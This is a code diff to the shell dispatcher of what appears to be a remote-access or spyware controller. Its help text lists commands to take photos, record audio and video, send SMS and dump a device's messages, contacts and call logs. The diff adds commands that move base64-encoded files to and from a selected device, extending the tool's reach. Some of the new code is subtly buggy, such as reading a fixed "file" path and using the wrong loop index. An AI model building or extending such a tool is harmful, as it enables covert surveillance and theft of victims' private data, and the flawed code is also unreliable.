@@ -4,7 +4,11 @@ import bane.connection.Connection;
 import bane.connection.device.Device;
 import bane.shell.Shell;
 import com.bane.model.*;
+import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.ArrayList;
+import java.util.Base64;
 
 public class ShellDispatcher extends Dispatcher {
 
@@ -46,22 +50,58 @@ public class ShellDispatcher extends Dispatcher {
             for (int i = 0; i < devices.size(); i++) {
                 System.out.println(devices.get(i).name);
             }
+        } else if(data.contains("upload")){
+            if(this.connection.getCurrentDevice() != null) {
+                String path = data.split(" ")[1];
+                File file = new File(path);
+                if(file.exists()){
+                    String filename = file.getName();
+                    try {
+                        byte[] fileBytes = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("file")));
+                        this.connection.send(new BaneObject(BaneCode.REQUEST, "", new BaneValue[]{
+                                new BaneValue<String>("filename", filename),
+                                new BaneValue<String>("file", new String(fileBytes))
+                        }));
+                    } catch (Exception e) {
+                        shell.print_nok(e.getMessage());
+                    }
+                } else {
+                    shell.print_nok("File doesn't exist");
+                }
+            } else {
+                shell.print_nok("No selected device");
+            }
         } else {
             try {
                 if(this.connection.getCurrentDevice() != null){
                     BaneObject response = this.connection.send(new BaneObject(BaneCode.REQUEST,"",new BaneValue[]{new BaneValue<String>("command",data)}));
-                    if(response.message != null)
+                    if(response.message != null) {
                         this.shell.print_info(response.message);
+                    }
                     if(response.values != null){
                         for (int i = 0; i < response.values.length; i++) {
-                            this.shell.print_info((String) response.values[i].value);
+                            if(response.values[i].key.equals("filename")){
+                                File file = new File(((String) response.values[i].value));
+                                file.createNewFile();
+                                FileOutputStream fos = new FileOutputStream(file);
+                                for (int j = 0; j < response.values.length; j++) {
+                                    if(response.values[i].key.equals("file")){
+                                        fos.write(Base64.getDecoder().decode(((String)response.values[i].value).getBytes()));
+                                        fos.flush();
+                                        fos.close();
+                                        break;
+                                    }
+                                }
+                            } else if(!response.values[i].key.equals("file")) {
+                                this.shell.print_info((String) response.values[i].value);
+                            }
                         }
                     }
                 } else {
                     shell.print_nok("No selected device");
                 }
             } catch (Exception e){
-                e.printStackTrace();
+                shell.print_nok(e.getMessage());
             }
         }
     }
@@ -81,6 +121,8 @@ public class ShellDispatcher extends Dispatcher {
                 "photo\tTake photo (In development)\n"+
                 "record -d <time>\tRecord audio (In development)\n"+
                 "video -d <time>\tRecord video (In development)\n"+
+                "upload <path>\tUploads a file (In development)\n" +
+                "download <path>\tDownloads a file (In development)\n" +
                 "name <new name>\tChanges the name of the current device\n"+
                 "sendsms number \"text\"\tSends a message to a number"+
                 "dump [sms/contacts/calls]\tGet all sms/contacts/calls"
